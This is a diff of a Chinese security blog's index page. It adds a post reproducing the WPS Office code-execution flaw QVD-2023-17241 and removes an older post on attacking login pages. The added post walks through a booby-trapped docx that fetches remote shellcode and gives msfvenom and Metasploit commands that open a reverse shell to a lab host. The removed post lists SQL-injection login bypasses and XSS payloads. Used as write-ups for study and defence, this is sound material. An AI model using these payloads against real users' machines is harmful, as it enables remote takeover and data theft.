@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">84</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">85</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,221 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/" class="post-title-link" itemprop="url">WPS-Office代码执行漏洞（QVD-2023-17241）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-17 11:48:06 / 修改时间：15:13:35" itemprop="dateCreated datePublished" datetime="2023-08-17T11:48:06+08:00">2023-08-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="2023HW-0day-WPS-Office-代码执行漏洞-QVD-2023-17241-复现与分析"><a href="#2023HW-0day-WPS-Office-代码执行漏洞-QVD-2023-17241-复现与分析" class="headerlink" title="2023HW 0day|WPS Office 代码执行漏洞(QVD-2023-17241)复现与分析"></a>2023HW 0day|WPS Office 代码执行漏洞(QVD-2023-17241)复现与分析</h1><p><strong>免责声明</strong></p>
+<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong></p>
+<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><p>【威胁类型】：代码执行漏洞</p>
+<p>【类型】：数据验证不恰当</p>
+<p><strong>漏洞描述</strong>:：WPS Office for windows 的内置浏览器存在逻辑漏洞，攻击者可以利用该漏洞专门构造出恶意文档，受害者打开该文档并点击文档中的 URL 链接或包含了超级链接的图片时，存在漏洞版本的 WPS office 会通过内浏览器加载该链接，接着该链接中 js 脚本会通过 cefQucry 调用 WPS 端内 API下载文件并打开文件，进而导致恶意文件在受害者电脑上被运行。</p>
+<h2 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h2><p>WPS Office 2023个人版 &lt; =11.1.0.15120</p>
+<p>WPS Office 2019企业版 &lt; =11.8.2.12085</p>
+<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>​        比较靠谱解释是：在docx文档中嵌入一个远程链接，当使用wps去打开文档时会去请求这个链接，由于WPS内部浏览器存在漏洞，会调用系统的api去执行攻击者在html中构造的恶意代码从而导致RCE。</p>
+<p><strong>漏洞执行的流程是</strong>：</p>
+<p>当受害者用wps打开伪造的恶意文件<strong>poc.docx</strong>时，poc.docx的<strong>webExtension1.xm</strong>l文件就会被执行，然后访问<strong><a target="_blank" rel="noopener" href="http://clientweb.docer.wps.cn.cloudwps.cn/1.html">http://clientweb.docer.wps.cn.cloudwps.cn/1.html</a></strong>下载<strong>1.html</strong>恶意文件；然后系统就会执行1.html的<strong>shellcode</strong>变量的恶意命令执行代码，如网上poc的打开计算器、还有getshell命令等。</p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145114731.png" alt="image-20230817145114731"></p>
+<h3 id="恶意文件介绍"><a href="#恶意文件介绍" class="headerlink" title="恶意文件介绍"></a>恶意文件介绍</h3><p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145138543.png" alt="image-20230817145138543"></p>
+<ul>
+<li><p><strong>恶意文件1：poc.docx</strong></p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145204179.png" alt="image-20230817145204179"></p>
+</li>
+</ul>
+<p>​        虽然改文件是.docx后缀，其真实文件类型是.zip，而该压缩文件包含多个文件。利用压缩软件打开poc.docx就能看到其“庐山真面目”，如下</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145213609.png" alt="image-20230817145213609"></p>
+<p>注意：不能直接右键 ⟶ 添加到压缩文件，也不能直接把文件拉到软件图标打开</p>
+<p><strong>打开方式1</strong>：右键 ⟶ 打开方式 ⟶ 找到自己的压缩软件打开⟶解压</p>
+<p><strong>打开方式2</strong>：先打开压缩软件，再在软件翻找到poc.docx，双击打开⟶解压</p>
+<p><strong>WebExtension1.xml</strong></p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145439950.png" alt="image-20230817145439950"></p>
+<p>​        用压缩软件打开poc.docx后，到..\poc\poc\word\webExtensions目录下可以看到webExtension1.xml文件，该文件绑定了访问恶意服务器的域名，即写了（访问）下载恶意文件的链接（<strong>红框部分</strong>）。当受害者用wps打开poc.docx时，其电脑就会访问<a target="_blank" rel="noopener" href="http://clientweb.docer.wps.cn.cloudwps.cn/1.html%E4%B8%8B%E8%BD%BD**1.html**%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82">http://clientweb.docer.wps.cn.cloudwps.cn/1.html下载**1.html**恶意文件。</a></p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145457736.png" alt="image-20230817145457736"></p>
+<ul>
+<li><strong>恶意文件2：1.html</strong></li>
+</ul>
+<p>​        1.html是执行恶意命令的文件。其中执行的恶意代码，保存在<strong>shellcode</strong>变量中。</p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145549126.png" alt="image-20230817145549126"></p>
+<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><p>漏洞复现WPS Office版本：11.1.0.12300-release</p>
+<p><strong>注意</strong>：即使有的WPS有这个漏洞，但是复现的windows系统不同，复现结果也是不一样的。</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145616058.png" alt="image-20230817145616058"></p>
+<h3 id="POC复现"><a href="#POC复现" class="headerlink" title="POC复现"></a>POC复现</h3><ul>
+<li><strong>效果</strong>：在本地弹出计算器</li>
+</ul>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145710285.png" alt="image-20230817145710285"></p>
+<ul>
+<li><strong>步骤1：域名绑定</strong></li>
+</ul>
+<p>​        编辑C:\Windows\System32\drivers\etc\hosts文件，将域名clientweb.docer.wps.cn.cloudwps.cn绑定到本地127.0.0.1。（**这里是以本地搭建恶意服务器）</p>
+<p><font color="red"><strong>疑问：黑客不可能自己到靶机上修改host文件吧，那他是如何利用的呢？</strong></font> </p>
+<p><strong>网上一些回答：</strong>在docx文档中嵌入一个远程链接，当使用wps去打开文档时会去请求这个链接，由于WPS内部浏览器存在漏洞，会调用系统的api去执行攻击者在html中构造的恶意代码从而导致RCE。</p>
+<p><strong>个人猜想：</strong>由于漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。<strong>那么黑客实际应用时，是否可以不用执行该一步？他可以自己搭建恶意服务器，在poc.docx的WebExtension1.xml放上自己的恶意服务器即可.</strong></p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150027757.png" alt="image-20230817150027757"></p>
+<ul>
+<li><strong>步骤2：启动的http服务</strong></li>
+</ul>
+<p>**方式1:**在1.html所在目录下用python起一个http服务</p>
+<p>l  <strong>python -m http.server 80                     # python3版本使用</strong></p>
+<p>l  <strong>python -m SimpleHTTPServer 80         #python2版本使用</strong></p>
+<p>​        如果开启80端口报错（如下图. 用80端口启动报错），可能是因为80端口被占用所导致的，可以开启其他端口，如8080端口（图. 用8080端口启动）。</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150235426.png" alt="image-20230817150235426"></p>
+<p>图. 用80端口启动报错</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150250866.png" alt="image-20230817150250866"></p>
+<p>图. 用8080端口启动</p>
+<p>注意，如果使用其他端口启动，需要修改webExtension1.xml文件</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150302863.png" alt="image-20230817150302863"></p>
+<p><strong>方式2：</strong></p>
+<p>把poc放进PhpStudy的环境里面，但一定是根目录，然后启动PhpStudy。</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150324698.png" alt="image-20230817150324698"></p>
+<ul>
+<li><strong>步骤3：执行poc</strong></li>
+</ul>
+<p>用wps打开poc.docx</p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150350250.png" alt="image-20230817150350250"> </p>
+<h3 id="EXP：利用CS进行getshell"><a href="#EXP：利用CS进行getshell" class="headerlink" title="EXP：利用CS进行getshell"></a>EXP：利用CS进行getshell</h3><p><strong>【环境】</strong></p>
+<p>Kail：（eth0）192.168.91.128</p>
+<p>Window10：（Ethernet0）192.168.91.129</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150409683.png" alt="image-20230817150409683"></p>
+<ul>
+<li><strong>步骤1：绑定域名</strong></li>
+</ul>
+<p>将域名绑定kali的ip。</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150447734.png" alt="image-20230817150447734"></p>
+<ul>
+<li><strong>步骤2：构造poc.docx</strong></li>
+</ul>
+<p>​        解压poc.docx，然后找到\word\webExtensions\webExtensions1.xml，修改其中的url，这里用8080端口，避免与80端口的服务碰撞。</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150515910.png" alt="image-20230817150515910"></p>
+<p>​        保存后再将解压出来的文件重新打包成poc.zip，并修改后缀为docx，得到新的poc.docx。</p>
+<ul>
+<li><strong>步骤3：构造1.html</strong></li>
+</ul>
+<p>l  CS创建一个监听器</p>
+<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150608919.png" alt="image-20230817150608919"></p>
+<p>l  <strong>生成一个C#的payload</strong></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150623140.png" alt="image-20230817150623140"></p>
+<p>l  将payload内容写入到1.html的shellcode变量里，得到新的1.html文件，1.html要放到kali里。</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150647067.png" alt="image-20230817150647067"></p>
+<ul>
+<li><strong>步骤4：启动http服务</strong></li>
+</ul>
+<p>​        在kali的1.html目录下用python启动http服务<code>python -m http.server 8080</code></p>
+<ul>
+<li><strong>步骤5：反弹shell</strong></li>
+</ul>
+<p>l <strong>Win10打开新的poc.docx</strong></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150804168.png" alt="image-20230817150804168"></p>
+<p>l <strong>Kali**</strong>接收到请求服务**</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150821773.png" alt="image-20230817150821773"></p>
+<p>l <strong>win系统上线CS</strong></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150845091.png" alt="image-20230817150845091"></p>
+<h3 id="EXP：利用MSF进行getshell"><a href="#EXP：利用MSF进行getshell" class="headerlink" title="EXP：利用MSF进行getshell"></a>EXP：利用MSF进行getshell</h3><p><strong>！！注意：其他文件复用 “EXP：利用CS进行getshell”的文件。</strong></p>
+<p><strong>步骤1：构造1.html</strong></p>
+<p>l MSF生成一个C#后门</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.91.128 LPORT=4444 -f csharp &gt; shellcode.cs</code></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150940143.png" alt="image-20230817150940143"></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150952512.png" alt="image-20230817150952512"></p>
+<p>l 将shellcode.cs的变量值（红框）替换到1.html的shellcode值</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151009031.png" alt="image-20230817151009031"></p>
+<p>替换1.html的shellcode值</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151024917.png" alt="image-20230817151024917"></p>
+<ul>
+<li><strong>步骤2：MSF设置exploit并监听</strong></li>
+</ul>
+<p><code># msfconsole</code></p>
+<p><code>msf6 &gt; use exploit/multi/handler</code></p>
+<p><code>msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</code></p>
+<p><code>msf6 exploit(multi/handler) &gt; set lhost 192.168.91.128</code></p>
+<p><code>msf6 exploit(multi/handler) &gt; set lport 4444</code></p>
+<p><code>msf6 exploit(multi/handler) &gt; run</code></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151117209.png" alt="image-20230817151117209"></p>
+<p><strong>步骤3：启动http服务用来捕获请求</strong></p>
+<p><code>python3 -m http.server 8080</code></p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151137873.png" alt="image-20230817151137873"></p>
+<p><strong>步骤4：触发shell</strong></p>
+<p>l  Win10打开poc.docx</p>
+<p>l  Win10请求了Kali上的1.html</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151202701.png" alt="image-20230817151202701"></p>
+<p>l  MSF反弹到shell</p>
+<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151220722.png" alt="image-20230817151220722"></p>
+<h3 id="0x05-漏洞修复与防护"><a href="#0x05-漏洞修复与防护" class="headerlink" title="0x05 漏洞修复与防护"></a>0x05 漏洞修复与防护</h3><ul>
+<li> <strong>修复</strong></li>
+</ul>
+<p>1.把WPS升级到最新版本</p>
+<p>2.到官网下载补丁进行修复。、官方已发布相关补丁，如果您在使用 WPS office 的企业版请尽快联系官方技术工程师或客服获取最新版本，并确保企业版升级到11.8.2.12085;如果您使用的是 WPS ffice 个人版，请通过 WPS官网 https: //<a target="_blank" rel="noopener" href="http://www.wps.cn/">www.wps.cn</a> 获取最新版本进行升级</p>
+<ul>
+<li>  <strong>防护</strong></li>
+</ul>
+<p>1、请不要随意打开 PPS、PPSX、PPT、PPTX、DOC、DOCX、XLSXLSX 文档</p>
+<p>2、请勿随意点击 PPS、PPSX、PPT、PPTX、DOC、DOCX、XLS、XLSX文档中的 URL 链接或带 URL 超级链接的图片或视频等</p>
+<p>3、如果使用 WPS 打开 PDF 文件，请勿随意点击 PDF 中的 URL 链接或超级链接</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1737,178 +1952,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/13/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="post-title-link" itemprop="url">登录界面的利用姿势</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-13 17:04:22" itemprop="dateCreated datePublished" datetime="2023-08-13T17:04:22+08:00">2023-08-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-14 20:10:58" itemprop="dateModified" datetime="2023-08-14T20:10:58+08:00">2023-08-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="渗透技巧-登录界面的利用姿势"><a href="#渗透技巧-登录界面的利用姿势" class="headerlink" title="渗透技巧|登录界面的利用姿势"></a>渗透技巧|登录界面的利用姿势</h1><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p><strong>测试方法：</strong></p>
-<pre><code>  手动测试例如下面的一些高频弱口令或者根据网站所使用的第三方组件，寻找特定的弱口令或默认口令进行登录，再不行也可BP暴力破解。</code></pre>
-<ul>
-<li>admin:123456</li>
-<li>admin:admin</li>
-<li>admin:admin@123</li>
-<li>admin:12345</li>
-<li>test:test</li>
-</ul>
-<h3 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a><strong>万能密码绕过</strong></h3><p><strong>测试方法：</strong></p>
-<ul>
-<li>用户名输入： ‘ or 1=1 or ‘ 密码：任意</li>
-<li>Admin’ - -（或‘ or 1=1 or ‘ - -）(admin or 1=1 –) (MS SQL)(直接输入用户名，不进行密码验证)</li>
-<li>用户名输入：admin      密码输入：’ or ‘1’=’1 也可以</li>
-<li>用户名输入：admin’ or ‘a’=’a       密码输入：任意</li>
-<li>用户名输入：‘ or 1=1 - -</li>
-<li>用户名输入：admin‘ or 1=1 - - 密码输入：任意</li>
-<li>用户名输入：1’or’1’=’1’or’1’=’1  密码输入：任意</li>
-<li>或者网上搜一搜其他的一些针对性的万能密码</li>
-</ul>
-<h3 id="登录认证绕过"><a href="#登录认证绕过" class="headerlink" title="登录认证绕过"></a>登录认证绕过</h3><p><strong>测试方法：</strong></p>
-<ul>
-<li>直接访问内部URL：使用扫描工具找到含有admin、manager、administrator、login等词语的路径，尝试使用普通的登录用户访问这些URL。从而获得管理员的权限。</li>
-<li>修改参数绕过认证：应用程序可能会使用一个参数或一个隐藏的域表示一个用户是否经过验证了，通过修改这些参数，从而被认为是已经认证过的用户。例如：<a target="_blank" rel="noopener" href="http://www.xxx.xom/userinfo.jsp?authenticated=no%EF%BC%8C%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9authenticated%E5%8F%82%E6%95%B0%E4%B8%BAyes%EF%BC%8Chttp://www.xxx.xom/userinfo.jsp?authenticated=yes%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AE%A4%E8%AF%81%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8%E9%A1%B5%E9%9D%A2%E3%80%82">http://www.xxx.xom/userinfo.jsp?authenticated=no，通过修改authenticated参数为yes，http://www.xxx.xom/userinfo.jsp?authenticated=yes，然后就可以通过认证，直接访问内部页面。</a></li>
-<li>可猜测的SessionID：利用规律，猜测到一个有效的SessionID，然后通过修改请求中的SessionID为一个预测到的有效的SessionID，从而冒充会话的真正拥有着，绕过认证环节。</li>
-<li>前端验证绕过：修改返回码,一般可以尝试true、success、200、0、1等</li>
-</ul>
-<h3 id="图形验证码不失效"><a href="#图形验证码不失效" class="headerlink" title="图形验证码不失效"></a>图形验证码不失效</h3><p><strong>测试方法：</strong></p>
-<ul>
-<li>输入用户名、密码、验证码后，点击登陆按钮同时将数据包使用burpsuite进行拦截，并使用Repeater模块或Intruder模块进行数据重放，重新发送五次观察页面变化，是否会提示验证码输入错误等信息</li>
-</ul>
-<h3 id="短信验证码不失效"><a href="#短信验证码不失效" class="headerlink" title="短信验证码不失效"></a>短信验证码不失效</h3><p><strong>测试方法：</strong></p>
-<ul>
-<li>请求发送短信，填写任意验证码，然后提交其他操作请求，将验证码参数置空或删除，测试是否可绕过检测；</li>
-<li>尝试特权验证码，如000000、111111等；</li>
-<li>同一个短信验证码是否能使用多次；</li>
-</ul>
-<h3 id="短信攻击"><a href="#短信攻击" class="headerlink" title="短信攻击"></a>短信攻击</h3><p><strong>测试方法：</strong></p>
-<ul>
-<li>手工找到有关网站注册页面，认证页面，是否具有短信发送页面，如果有，则进行下一步。</li>
-<li>通过利用burp或者其它抓包截断工具，抓取发送验证码的数据包，并且进行重放攻击，查看手机是否在短时间内连续收到10条以上短信，如果收到大量短信，则说明存在该漏洞。</li>
-</ul>
-<h3 id="反射型跨站脚本攻击"><a href="#反射型跨站脚本攻击" class="headerlink" title="反射型跨站脚本攻击"></a>反射型跨站脚本攻击</h3><p><strong>测试方法：</strong></p>
-<p><strong>GET方式跨站脚本：</strong> </p>
-<ul>
-<li><p>在输入的参数后逐条添加以下语句，以第一条为例，输入</p>
-<img src="/2023/08/13/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20230814173735695.png" alt="image-20230814173735695" style="zoom:80%;">
-</li>
-<li><p>只要其中一条弹出显示123456的告警框，就说明存在跨站漏洞，记录漏洞，停止测试。</p>
-</li>
-<li><p>如果没有弹出显示123456的告警框，则在返回的页面上单击鼠标右 键，选择“查看源文件”。</p>
-</li>
-<li><p>查找网页源文件中是否包含完整的字符串<img src="/2023/08/13/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20230814173808226.png" alt="image-20230814173808226" style="zoom: 80%;">，则不管有没有弹出显示123456的告警框，都表明存在跨站脚本漏洞。</p>
-</li>
-<li><p>由于有些HTML元素（比如<code>&lt;textarea&gt;</code>或”）会影响脚本的执行，所以不一定能够正确弹出123456告警框，需要根据返回网页源文件的内容，构造value的值</p>
-</li>
-</ul>
-<p> <strong>Post方式跨站脚本</strong></p>
-<ul>
-<li><p>在POST表单中逐条输入以下语句，只要其中一条弹出显示123456的对话框，就说明存在跨站漏洞，记录漏洞，停止测试。</p>
-<p><img src="/2023/08/13/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20230814173841816.png" alt="image-20230814173841816"></p>
-</li>
-</ul>
-<p>[img]javascript:alert(123456);[/img]</p>
-<ul>
-<li>如果没有弹出显示123456的告警框，则在返回的页面上单击鼠标右键，选择“查看源文件”</li>
-<li>查找网页源文件中是否包含完整的字符串<img src="/2023/08/13/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20230814173901807.png" alt="image-20230814173901807" style="zoom:80%;">，则不管有没有弹出显示123456的告警框，都表明存在跨站脚本漏洞。</li>
